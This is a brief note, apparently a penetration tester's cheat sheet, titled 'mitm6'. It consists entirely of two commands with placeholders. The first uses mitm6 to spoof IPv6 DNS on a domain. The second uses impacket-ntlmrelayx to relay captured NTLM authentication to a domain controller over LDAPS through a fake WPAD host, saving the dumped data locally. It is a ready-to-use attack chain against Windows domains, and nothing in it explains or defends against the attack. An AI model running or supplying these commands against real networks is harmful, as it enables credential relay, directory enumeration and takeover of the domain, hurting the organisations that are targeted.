mitm6

~~~bash
mitm6 -d [domain].[ext]
~~~

~~~bash
impacket-ntlmrelayx -6 -t ldaps://[domain controller ip] -wh nullwpad.[domain].[ext] -l /home/kali/Working/enumeration/mitm6_dump
~~~

